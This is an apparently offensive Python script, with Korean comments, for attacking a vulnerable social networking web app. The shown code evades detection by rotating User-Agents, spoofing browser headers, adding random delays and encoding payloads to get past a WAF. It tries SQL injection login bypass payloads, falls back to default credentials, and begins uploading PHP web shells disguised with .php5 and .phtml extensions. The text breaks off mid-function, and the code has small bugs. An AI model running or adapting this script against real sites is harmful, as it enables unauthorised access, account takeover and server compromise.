import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, unquote
import time
import json
import re
from datetime import datetime
import random
import base64
import string

class AdvancedVulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server, stealth_mode=True, report_dir="security_reports"):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.stealth_mode = stealth_mode
        self.report_dir = report_dir

        # User-Agent 로테이션을 위한 리스트
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]

        self.set_random_user_agent()
        self.add_legitimate_headers()
        
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []

        # WAF 우회를 위한 인코딩 방식
        self.encoding_methods = ['url', 'double_url', 'hex', 'unicode', 'mixed']
    
    def set_random_user_agent(self):
        """랜덤 User-Agent 설정"""
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
    
    def add_legitimate_headers(self):
        """정상적인 브라우저처럼 보이게 하는 헤더 추가"""
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })

    def add_delay(self, min_delay=0.5, max_delay=3.0):
        """탐지 회피를 위한 랜덤 딜레이"""
        if self.stealth_mode:
            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)

    def encode_payload(self, payload, method='url'):
        """다양한 인코딩으로 WAF 우회"""
        if method == 'url':
            return quote(payload, safe='')
        elif method == 'double_url':
            return quote(quote(payload, safe=''), safe='')
        elif method == 'hex':
            return ''.join([f'%{ord(c):02x}' for c in payload])
        elif method == 'unicode':
            # Unicode 변환
            replacements = {
                "'": "\\u0027",
                '"': "\\u0022",
                '<': "\\u003c",
                '>': "\\u003e",
                '/': "\\u002f",
                ' ': "\\u0020"
            }
            for char, unicode_char in replacements.items():
                payload = payload.replace(char, unicode_char)
            return payload
        elif method == 'mixed':
            # 대소문자 혼용
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        return payload
    
    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)

    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)

    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def login_sql_injection(self):
        self.print_section("SQL Injection - WAF Bypass")
        
        login_url = f"{self.base_url}/login.php"
        
        print("[*] Testing Advanced SQL Injection payloads with WAF bypass...")

        # 페이로드
        basic_payloads = [
            ("admin", "' or '1'='1", "Password field injection"),
            ("admin' or 1=1#", "1", "basic or 1=1")
        ]

        # basic_payloads.append(("admin", "admin123", "Default credentials (fallback)"))

        success_count_sql = 0

        for username, password, desc in basic_payloads:
            try:
                # 탐지 회피를 위한 랜덤 딜레이
                self.add_delay()
                # User-Agent 로테이션
                if random.random() > 0.7: # 30% 확률로 UA 변경
                    self.set_random_user_agent()
                
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")

                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)

                # 디버깅 출력
                print(f"    Response URL: {response.url}")
                print(f"    Response status: {response.status_code}")

                if 'index.php' in response.url:
                    print(f"[+] SUCCESS! Logged in")
                    print(f"    Final URL: {response.url}")

                    self.logged_in = True
                    self.get_attacker_user_id()
                    success_count_sql += 1

                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': desc,
                        'impact': 'CRITICAL - Authentication bypass with WAF evasion',
                        'cvss_score': 9.8,
                        'waf_bypass_technique': desc
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)

                    self.log_event(
                        'SQL_INJECTION'
                        f'Successfully bypassed authentication using SQL injection: {desc}',
                        'CRITICAL',
                        {
                            'payload': f"username={username}, password={password}",
                            'method': desc,
                            'account': 'admin',
                            'waf_bypass': True
                        }
                    )

                    # 3개 이상 성공하면 중단
                    if success_count_sql >= 3:
                        print(f"\n[+] Multiple bypasses found. Stopping SQL injection tests.")
                        return True

                elif 'login.php' in response.text:
                    print("[-] Warning: Still seeing login form, might be failed login")
                    print(f"[-] Failed - Still on: {response.url}")
                
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")

        if not self.logged_in:
            print("\n[*] Trying default credentials...")
            default_creds = [
                ("admin", "admin123"),
                ("alice", "alice2024"),
                ("bob", "bobby123")
            ]

            for username_d, password_d in default_creds:        
                try:
                    self.add_delay()
                    print(f"[*] Trying: {username_d}/{password_d}")
                    data_d = {'username': username_d, 'password': password_d}
                    response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)

                    print(f"    Response URL: {response.url}")
                    print(f"    Response Status: {response.status_code}")

                    if 'index.php' in response.url:
                        print(f"[+] SUCCESS with default credentials")
                        self.logged_in = True

                        self.get_attacker_user_id()

                except:
                    continue

        return self.logged_in
    
    def shell_file_upload(self):
        self.print_section("Shell File Upload")

        if not self.logged_in:
            print("[-] Login Required")
            return False
        
        upload_url = f"{self.base_url}/upload.php"
        file_url = f"{self.base_url}/file.php"

        shell_list = [
            ('shell98.php5', 'application/x-php', 'basic', 'PHP5 extension'),
            ('shell98.phtml', 'application/x-php', 'basic', 'PHTML extension')
        ]

        success_count_shell = 0
        successful_shells = []
        uploaded_files = set()

        print("[*] Testing multiple file upload bypass techniques...")